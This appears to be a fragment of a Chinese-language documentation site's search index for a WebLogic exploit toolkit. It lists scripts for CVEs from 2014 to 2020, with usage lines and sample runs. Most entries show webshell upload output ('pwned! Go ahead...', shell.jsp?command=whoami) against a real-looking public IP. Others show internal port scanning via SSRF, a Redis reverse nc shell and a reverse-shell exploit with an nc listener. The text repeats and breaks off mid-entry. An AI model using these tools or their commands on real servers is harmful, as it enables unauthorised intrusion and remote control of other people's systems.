10.0.2 Weblogic 10.3.6 USE: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py +----------------------------------------------------------------------+ + USE: python <filename> <target_ip:port> <scan_address> <process> + + EXP: python cve-2014-4210_ssrf_scan.py 1.1.1.1:7001 192.168.1.0 20 + + VER: 10.0.2,10.3.6 + +----------------------------------------------------------------------+ EXP: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py 59.110.214.109:7001 192.168.112.0 30 192.168.112 [*]+------------------------+ [*]+ Scanning ip and port + [*]+------------------------+ [+] 192.168.112.1:22 [+] 192.168.112.2:80 [+] 192.168.112.3:7001 [+] 192.168.112.1:7001 [+] 192.168.112.2:6379 [*]+------------------------+ [*]+ Scan completed + [*]+------------------------+ CVE-2014-4210_ssrf_scan.py Weblogic SSRF \u6f0f\u6d1e\u626b\u63cf\u5185\u7f51\u7aef\u53e3 \u00b6 VER: Weblogic 10.0.2 Weblogic 10.3.6 USE: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_redis_shell.py +---------------------------------------------------------------------------------------------------+ + USE: python <filename> <weblogic_ip> <weblogic_port> <inside_ip> <inside_port> <nc_ip> <nc_port> + + EXP: python filename.py 1.1.1.1 7001 192.168.1.1 6379 2.2.2.2 5555 + + VER: 10.0.2,10.3.6 + +---------------------------------------------------------------------------------------------------+ DES: <weblogic_ip> weblogic\u7684IP\u5730\u5740 <weblogic_port> weblogic\u7684\u7aef\u53e3\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e3a7001 <inside_ip> \u5185\u7f51redis\u4e3b\u673a\u7684IP\u5730\u5740\uff0c\u8be5\u5730\u5740\u901a\u8fc7 6.1 \u7684scan\u811a\u672c\u5f97\u51fa <inside_port> \u5185\u7f51redis\u7684\u7aef\u53e3\uff0c\u9ed8\u8ba46379 <nc_ip> \u53cd\u5f39nc shell\u7684IP <nc_port> \u53cd\u5f39nc shell\u7684\u7aef\u53e3 EXP: CVE-2017-3506_poc.py Weblogic wls-wsat\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c \u00b6 VER: 10.3.6.0 12.1.3.0 12.2.1.0 12.2.1.1 12.2.1.2 USE: zhzy@debian:$ python cve-2017-3506_poc.py +--------------------------------------------------------+ + USE: python cve-2017-3506_poc.py <url:port> + + VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2 + + EXP: python cve-2017-3506_poc.py 59.110.214.109:7001 + +--------------------------------------------------------+ EXP: zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7001 [+] CVE-2017-3506 Vulnerability zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7000 [-] No Vulnerability cve-2017-3506_webshell.jar Weblogic wls-wsat\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u4e0a\u4f20Webshell \u00b6 VER: 10.3.6.0 12.1.3.0 12.2.1.0 12.2.1.1 12.2.1.2 USE: zhzy@debian:$ java -jar cve-2017-10271_webshell.jar [*] Oracle : WebLogic wls-wsat RCE Exp [*] CVE ID : CVE-2017-3506 & CVE-2017-10271 [*] Vulnerability info : https://secfree.com/article-635.html [*] Author : Bearcat@secfree.com [*] Vulnerability page \uff1awls-wsat/CoordinatorPortType & wls-wsat/CoordinatorPortType11 [*] Usage \uff1ajava -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx.xxx:7001 test.jsp [*] Vulnerability patch : http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html EXP: zhzy@debian:$ java -jar cve-2017-10271_webshell.jar http://59.110.214.109:7007 > shell.jsp [*] Starting exploit... [*] Sending payloads... [*] Payloads sent... [*] Opening shell... [*] pwned! Go ahead... [+] http://59.110.214.109:7007/bea_wls_internal/shell.jsp?password=secfree&command=whoami cve-2017-10271_poc.jar Weblogic wls-wsat XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c \u00b6 VER: Oracle WebLogic Server10.3.6.0.0 \u7248\u672c Oracle WebLogic Server12.1.3.0.0 \u7248\u672c Oracle WebLogic Server12.2.1.1.0 \u7248\u672c Oracle WebLogic Server12.2.1.2.0 \u7248\u672c USE: zhzy@debian:$ java -jar cve-2017-10271_poc.jar [*] WebLogic wls-wsat\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177 [*] CVE\u7f16\u53f7 CVE-2017-10271 [*] \u6f0f\u6d1e\u8be6\u60c5 https://www.secfree.com/article-635.html [*] \u4f5c\u8005\u90ae\u7bb1 Bearcat@secfree.com [*] \u4f7f\u7528\u65b9\u6cd5: [*] \u5355\u4e2aURL\u68c0\u6d4b java -jar WebLogic-Wls-wsat-XMLDecoder.jar -u http://www.xxx.com:7001 [*] \u6279\u91cf\u68c0\u6d4b java -jar WebLogic-Wls-wsat-XMLDecoder.jar -f UrlfilePath EXP: zhzy@debian:$ java -jar cve-2017-10271_poc.jar -u http://59.110.214.109:7001 [11:33:37] [+] \u6f0f\u6d1e\u5b58\u5728 http://59.110.214.109:7001/wls-wsat/test.logs cve-2017-10271_webshell.jar Weblogic wls-wsat XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff0c\u4e0a\u4f20Webshell \u00b6 VER: Oracle WebLogic Server10.3.6.0.0 \u7248\u672c Oracle WebLogic Server12.1.3.0.0 \u7248\u672c Oracle WebLogic Server12.2.1.1.0 \u7248\u672c Oracle WebLogic Server12.2.1.2.0 \u7248\u672c EXP: zhzy@debian:$ java -jar cve-2017-10271_webshell.jar -u http://59.110.214.109:7001 [*] Starting exploit... [*] Sending payloads... [*] Payloads sent... [*] Opening shell... [*] pwned! Go ahead... [+] -u/bea_wls_internal/http://59.110.214.109:7001?password=secfree&command=whoami cve-2018-2628_poc.py Weblogic WLS Core Components \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u9a8c\u8bc1\u811a\u672c [\u4f7f\u7528] \u00b6 zhzy@debian:$ python cve-2018-2628_poc.py +--------------------------------------------------------+ + USE: python cve-2018-2628_poc.py <ip> <port> + + VER: Oracle WebLogic Server 10.3.6.0 + + Oracle WebLogic Server 12.2.1.2 + + Oracle WebLogic Server 12.2.1.3 + + Oracle WebLogic Server 12.1.3.0 + + EXP: python cve-2018-2628_poc.py 1.1.1.1 7001 + +--------------------------------------------------------+ cve-2018-2628_webshell.py Weblogic WLS Core Components \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c [\u4f7f\u7528] \u00b6 USE: zhzy@debian:$ python cve-2018-2628_webshell.py +---------------------------------------------------------------+ + USE: python cve-2018-2628_webshell.py <ip> <port> <webshell> + + VER: Oracle WebLogic Server 10.3.6.0 + + Oracle WebLogic Server 12.2.1.2 + + Oracle WebLogic Server 12.2.1.3 + + Oracle WebLogic Server 12.1.3.0 + + EXP: python cve-2018-2628_webshell.py 1.1.1.1 7001 shell1.jsp + +---------------------------------------------------------------+ EXP: zhzy@debian:$ python cve-2018-2628_webshell.py 1.1.1.11 7001 shell1.jsp [*] handshake successful [*] usage: python cve-2018-2628.py ip port shell1.jsp [+] Shell Dir: servers\\AdminServer\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war\\shell1.jsp [+] Webshell: http://1.1.1.1:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg== cve-2018-2893_poc.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c \u00b6 VER: Oracle WebLogic Server 10.3.6.0 Oracle WebLogic Server 12.1.3.0 Oracle WebLogic Server 12.2.1.2 Oracle WebLogic Server 12.2.1.3 USE: zhzy@debian:$ python cve-2018-2893_poc.py +--------------------------------------------------------+ + USE: python cve-2017-3506_poc.py <url:port> + + VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2 + + EXP: python cve-2017-3506_poc.py 59.110.214.109:7001 + +--------------------------------------------------------+ EXP: zhzy@debian:$ python cve-2018-2893_poc.py 59.110.214.109 7001 [+] testing target [+] send request payload successful,recv length:1700 [+] 59.110.214.109:7001 is vul CVE-2018-2893 cve-2018-2893_cmd.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c \u00b6 zhzy@debian:$ python cve-2018-2893_cmd.py +------------------------------------------------------------------------------+ + VER: Oracle WebLogic Server 10.3.6.0 + + Oracle WebLogic Server 12.1.3.0 + + Oracle WebLogic Server 12.2.1.2 + + Oracle WebLogic Server 12.2.1.3 + + USE: python cve-2018-2893_cmd.py <host> <port> <reverse_host> <reverse_port> + + EXP: python cve-2018-2893_cmd.py 1.1.1.1 7001 2.2.2.2 3333 + + [2.2.2.2] nc -lvvp 3333 + +------------------------------------------------------------------------------+ cve-2018-2894_poc_exp.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u68c0\u6d4b+\u5229\u7528 \u00b6 VER: 10.3.6.0 12.1.3.0 12.2.1.2 12.2.1.3 EXP: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2018-2894_upload.py -t http://1.1.1.1:7001 [*] First Deploying Website Please wait a moment ... [+] http://1.1.1.1:7001 exists CVE-2018-2894 [+] Check URL: http://1.1.1.1:7001/ws_utc/css/config/keystore/1585895893159_360sglab.jsp cve-2019-2618_webshell.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e (\u9700\u8981\u8d26\u6237\u5bc6\u7801) \u00b6 USE: zhzy@debian:$ python cve-2019-2618_webshell.py +-----------------------------------------------------------------------+ + VER: Oracle WebLogic Server 10.3.6.0 + + Oracle WebLogic Server 12.1.3.0 + + Oracle WebLogic Server 12.2.1.3 + + USE: python cve-2019-2618_webshell.py <username> <password> + + EXP: python cve-2019-2618.py http://1.1.1.1:7001 weblogic Oracle@123 + +-----------------------------------------------------------------------+ EXP: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2019-2618_webshell.py http://1.1.1.1:7007/ weblogic Oracle@123 ======================================================================== _______ ________ ___ ___ __ ___ ___ __ __ ___ / ____\\ \\ / / ____| |__ \\ / _ \\/_ |/ _ \\ |__ \\ / //_ |/ _ \\ | | \\ \\ / /| |__ ______ ) | | | || | (_) |______ ) / /_ | | (_) | | | \\ \\/ / | __|______/ /| | | || |\\__, |______/ / '_ \\| |> _ < | |____ \\ / | |____ / /_| |_| || | / / / /| (_) | | (_) | \\_____| \\/ |______| |____|\\___/ |_| /_/ |____\\___/|_|\\___/ Weblogic Upload Vuln(Need username password)-CVE-2019-2618 By Jas502n ======================================================================== >>>>Upload Shell Addresss: http://1.1.1.1:7007/bea_wls_internal/shell.jsp cve-2020-2551_poc.py Weblogic IIOP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c \u00b6 USE: zhzy@debian:$ python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001 +--------------------------------------------------- -----+ + USE: python cve-2020-2551_poc.py <url:port> + + VER: 10.3.6.0.0 + + 12.1.3.0.0 + + 12.2.1.3.0 + + 12.2.1.4.0 + + EXP: python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001 + +-----------------------------------------------------------+ [+] found CVE-2020-2551 1.1.1.1:7007","title":"About Oracle Weblogic"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#about-oracle-weblogic","text":"WebLogic\u662f\u7f8e\u56fdOracle\u516c\u53f8\u51fa\u54c1\u7684\u4e00\u4e2aapplication server\uff0c\u786e\u5207\u7684\u8bf4\u662f\u4e00\u4e2a\u57fa\u4e8eJAVAEE\u67b6\u6784\u7684\u4e2d\u95f4\u4ef6\uff0cWebLogic\u662f\u7528\u4e8e\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u5927\u578b\u5206\u5e03\u5f0fWeb\u5e94\u7528\u3001\u7f51\u7edc\u5e94\u7528\u548c\u6570\u636e\u5e93\u5e94\u7528\u7684Java\u5e94\u7528\u670d\u52a1\u5668\u3002\u5c06Java\u7684\u52a8\u6001\u529f\u80fd\u548cJava Enterprise\u6807\u51c6\u7684\u5b89\u5168\u6027\u5f15\u5165\u5927\u578b\u7f51\u7edc\u5e94\u7528\u7684\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u4e4b\u4e2d\u3002","title":"About Oracle Weblogic"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#vulnerability-list","text":"cve-2014-4210_ssrf_scan.py Weblogic SSRF \u626b\u63cf\u5185\u7f51\u7aef\u53e3\u5229\u7528\u811a\u672c [\u4f7f\u7528] cve-2014-4210_ssrf_redis_shell.py Weblogic SSRF\u6f0f\u6d1e\u5185\u7f51redis\u672a\u6388\u6743getshell\u811a\u672c [\u4f7f\u7528] cve-2017-3506_poc.py Weblogic wls-wsat \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c [\u4f7f\u7528] cve-2017-3506_webshell.jar Weblogic wls-wsat \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u4e0a\u4f20Webshell [\u4f7f\u7528] cve-2017-10271_poc.jar Weblogic wls-wsat XMLDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e [\u4f7f\u7528] cve-2017-10271_webshell.jar Weblogic wls-wsat XMLDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c [\u4f7f\u7528] cve-2018-2628_poc.py Weblogic WLS Core Components \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u9a8c\u8bc1\u811a\u672c [\u4f7f\u7528] cve-2018-2628_webshell.py Weblogic WLS Core Components \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c [\u4f7f\u7528] cve-2018-2893_poc.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c cve-2018-2893_cmd.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c cve-2018-2894_poc_exp.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u68c0\u6d4b+\u5229\u7528 cve-2019-2618_webshell.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e(\u9700\u8981\u8d26\u6237\u5bc6\u7801) [\u4f7f\u7528] cve-2020-2551_poc.py Weblogic IIOP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c","title":"Vulnerability list"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#readme","text":"\u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003 vulnerability-list \u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: \u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0","title":"Readme"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2014-4210_ssrf_scanpy-weblogic-ssrf","text":"VER: Weblogic 10.0.2 Weblogic 10.3.6 USE: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py +----------------------------------------------------------------------+ + USE: python <filename> <target_ip:port> <scan_address> <process> + + EXP: python cve-2014-4210_ssrf_scan.py 1.1.1.1:7001 192.168.1.0 20 + + VER: 10.0.2,10.3.6 + +----------------------------------------------------------------------+ EXP: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_scan.py 59.110.214.109:7001 192.168.112.0 30 192.168.112 [*]+------------------------+ [*]+ Scanning ip and port + [*]+------------------------+ [+] 192.168.112.1:22 [+] 192.168.112.2:80 [+] 192.168.112.3:7001 [+] 192.168.112.1:7001 [+] 192.168.112.2:6379 [*]+------------------------+ [*]+ Scan completed + [*]+------------------------+","title":"CVE-2014-4210_ssrf_scan.py Weblogic SSRF \u6f0f\u6d1e\u626b\u63cf\u5185\u7f51\u7aef\u53e3"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2014-4210_ssrf_scanpy-weblogic-ssrf_1","text":"VER: Weblogic 10.0.2 Weblogic 10.3.6 USE: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2014-4210_ssrf_redis_shell.py +---------------------------------------------------------------------------------------------------+ + USE: python <filename> <weblogic_ip> <weblogic_port> <inside_ip> <inside_port> <nc_ip> <nc_port> + + EXP: python filename.py 1.1.1.1 7001 192.168.1.1 6379 2.2.2.2 5555 + + VER: 10.0.2,10.3.6 + +---------------------------------------------------------------------------------------------------+ DES: <weblogic_ip> weblogic\u7684IP\u5730\u5740 <weblogic_port> weblogic\u7684\u7aef\u53e3\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e3a7001 <inside_ip> \u5185\u7f51redis\u4e3b\u673a\u7684IP\u5730\u5740\uff0c\u8be5\u5730\u5740\u901a\u8fc7 6.1 \u7684scan\u811a\u672c\u5f97\u51fa <inside_port> \u5185\u7f51redis\u7684\u7aef\u53e3\uff0c\u9ed8\u8ba46379 <nc_ip> \u53cd\u5f39nc shell\u7684IP <nc_port> \u53cd\u5f39nc shell\u7684\u7aef\u53e3 EXP:","title":"CVE-2014-4210_ssrf_scan.py Weblogic SSRF \u6f0f\u6d1e\u626b\u63cf\u5185\u7f51\u7aef\u53e3"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2017-3506_pocpy-weblogic-wls-wsat","text":"VER: 10.3.6.0 12.1.3.0 12.2.1.0 12.2.1.1 12.2.1.2 USE: zhzy@debian:$ python cve-2017-3506_poc.py +--------------------------------------------------------+ + USE: python cve-2017-3506_poc.py <url:port> + + VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2 + + EXP: python cve-2017-3506_poc.py 59.110.214.109:7001 + +--------------------------------------------------------+ EXP: zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7001 [+] CVE-2017-3506 Vulnerability zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7000 [-] No Vulnerability","title":"CVE-2017-3506_poc.py Weblogic wls-wsat\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2017-3506_webshelljar-weblogic-wls-wsatwebshell","text":"VER: 10.3.6.0 12.1.3.0 12.2.1.0 12.2.1.1 12.2.1.2 USE: zhzy@debian:$ java -jar cve-2017-10271_webshell.jar [*] Oracle : WebLogic wls-wsat RCE Exp [*] CVE ID : CVE-2017-3506 & CVE-2017-10271 [*] Vulnerability info : https://secfree.com/article-635.html [*] Author : Bearcat@secfree.com [*] Vulnerability page \uff1awls-wsat/CoordinatorPortType & wls-wsat/CoordinatorPortType11 [*] Usage \uff1ajava -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx.xxx:7001 test.jsp [*] Vulnerability patch : http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html EXP: zhzy@debian:$ java -jar cve-2017-10271_webshell.jar http://59.110.214.109:7007 > shell.jsp [*] Starting exploit... [*] Sending payloads... [*] Payloads sent... [*] Opening shell... [*] pwned! Go ahead... [+] http://59.110.214.109:7007/bea_wls_internal/shell.jsp?password=secfree&command=whoami","title":"cve-2017-3506_webshell.jar Weblogic wls-wsat\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u4e0a\u4f20Webshell"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2017-10271_pocjar-weblogic-wls-wsat-xmldecoder","text":"VER: Oracle WebLogic Server10.3.6.0.0 \u7248\u672c Oracle WebLogic Server12.1.3.0.0 \u7248\u672c Oracle WebLogic Server12.2.1.1.0 \u7248\u672c Oracle WebLogic Server12.2.1.2.0 \u7248\u672c USE: zhzy@debian:$ java -jar cve-2017-10271_poc.jar [*] WebLogic wls-wsat\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177 [*] CVE\u7f16\u53f7 CVE-2017-10271 [*] \u6f0f\u6d1e\u8be6\u60c5 https://www.secfree.com/article-635.html [*] \u4f5c\u8005\u90ae\u7bb1 Bearcat@secfree.com [*] \u4f7f\u7528\u65b9\u6cd5: [*] \u5355\u4e2aURL\u68c0\u6d4b java -jar WebLogic-Wls-wsat-XMLDecoder.jar -u http://www.xxx.com:7001 [*] \u6279\u91cf\u68c0\u6d4b java -jar WebLogic-Wls-wsat-XMLDecoder.jar -f UrlfilePath EXP: zhzy@debian:$ java -jar cve-2017-10271_poc.jar -u http://59.110.214.109:7001 [11:33:37] [+] \u6f0f\u6d1e\u5b58\u5728 http://59.110.214.109:7001/wls-wsat/test.logs","title":"cve-2017-10271_poc.jar Weblogic wls-wsat XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2017-10271_webshelljar-weblogic-wls-wsat-xmldecoderwebshell","text":"VER: Oracle WebLogic Server10.3.6.0.0 \u7248\u672c Oracle WebLogic Server12.1.3.0.0 \u7248\u672c Oracle WebLogic Server12.2.1.1.0 \u7248\u672c Oracle WebLogic Server12.2.1.2.0 \u7248\u672c EXP: zhzy@debian:$ java -jar cve-2017-10271_webshell.jar -u http://59.110.214.109:7001 [*] Starting exploit... [*] Sending payloads... [*] Payloads sent... [*] Opening shell... [*] pwned! Go ahead... [+] -u/bea_wls_internal/http://59.110.214.109:7001?password=secfree&command=whoami","title":"cve-2017-10271_webshell.jar Weblogic wls-wsat XMLDecoder\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff0c\u4e0a\u4f20Webshell"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2628_pocpy-weblogic-wls-core-components","text":"zhzy@debian:$ python cve-2018-2628_poc.py +--------------------------------------------------------+ + USE: python cve-2018-2628_poc.py <ip> <port> + + VER: Oracle WebLogic Server 10.3.6.0 + + Oracle WebLogic Server 12.2.1.2 + + Oracle WebLogic Server 12.2.1.3 + + Oracle WebLogic Server 12.1.3.0 + + EXP: python cve-2018-2628_poc.py 1.1.1.1 7001 + +--------------------------------------------------------+","title":"cve-2018-2628_poc.py Weblogic WLS Core Components \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u9a8c\u8bc1\u811a\u672c[\u4f7f\u7528]"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2628_webshellpy-weblogic-wls-core-components-webshell","text":"USE: zhzy@debian:$ python cve-2018-2628_webshell.py +---------------------------------------------------------------+ + USE: python cve-2018-2628_webshell.py <ip> <port> <webshell> + + VER: Oracle WebLogic Server 10.3.6.0 + + Oracle WebLogic Server 12.2.1.2 + + Oracle WebLogic Server 12.2.1.3 + + Oracle WebLogic Server 12.1.3.0 + + EXP: python cve-2018-2628_webshell.py 1.1.1.1 7001 shell1.jsp + +---------------------------------------------------------------+ EXP: zhzy@debian:$ python cve-2018-2628_webshell.py 1.1.1.11 7001 shell1.jsp [*] handshake successful [*] usage: python cve-2018-2628.py ip port shell1.jsp [+] Shell Dir: servers\\AdminServer\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war\\shell1.jsp [+] Webshell: http://1.1.1.1:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg==","title":"cve-2018-2628_webshell.py Weblogic WLS Core Components \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c[\u4f7f\u7528]"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2893_pocpy-weblogic-wls","text":"VER: Oracle WebLogic Server 10.3.6.0 Oracle WebLogic Server 12.1.3.0 Oracle WebLogic Server 12.2.1.2 Oracle WebLogic Server 12.2.1.3 USE: zhzy@debian:$ python cve-2018-2893_poc.py +--------------------------------------------------------+ + USE: python cve-2017-3506_poc.py <url:port> + + VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2 + + EXP: python cve-2017-3506_poc.py 59.110.214.109:7001 + +--------------------------------------------------------+ EXP: zhzy@debian:$ python cve-2018-2893_poc.py 59.110.214.109 7001 [+] testing target [+] send request payload successful,recv length:1700 [+] 59.110.214.109:7001 is vul CVE-2018-2893","title":"cve-2018-2893_poc.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2893_cmdpy-weblogic-wls","text":"zhzy@debian:$ python cve-2018-2893_cmd.py +------------------------------------------------------------------------------+ + VER: Oracle WebLogic Server 10.3.6.0 + + Oracle WebLogic Server 12.1.3.0 + + Oracle WebLogic Server 12.2.1.2 + + Oracle WebLogic Server 12.2.1.3 + + USE: python cve-2018-2893_cmd.py <host> <port> <reverse_host> <reverse_port> + + EXP: python cve-2018-2893_cmd.py 1.1.1.1 7001 2.2.2.2 3333 + + [2.2.2.2] nc -lvvp 3333 + +------------------------------------------------------------------------------+","title":"cve-2018-2893_cmd.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2018-2894_poc_exppy-weblogic","text":"VER: 10.3.6.0 12.1.3.0 12.2.1.2 12.2.1.3 EXP: zhzy@debian:/debian/archives-tool/web-weblogic$ python cve-2018-2894_upload.py -t http://1.1.1.1:7001 [*] First Deploying Website Please wait a moment ... [+] http://1.1.1.1:7001 exists CVE-2018-2894 [+] Check URL: http://1.1.1.1:7001/ws_utc/css/config/keystore/1585895893159_360sglab.jsp","title":"cve-2018-2894_poc_exp.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u68c0\u6d4b+\u5229\u7528"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2019-2618_webshellpy-weblogic","text":"USE: zhzy@debian:$ python cve-2019-2618_webshell.py +-----------------------------------------------------------------------+ + VER: Oracle WebLogic Server 10.3.6.0 + + Oracle WebLogic Server 12.1.3.0 + + Oracle WebLogic Server 12.2.1.3 + + USE: python cve-2019-2618_webshell.py <username> <password> + + EXP: python cve-2019-2618.py http://1.1.1.1:7001 weblogic Oracle@123 + +-----------------------------------------------------------------------+ EXP: zhzy@debian:/debian/archives-tool/web-weblogic$ python 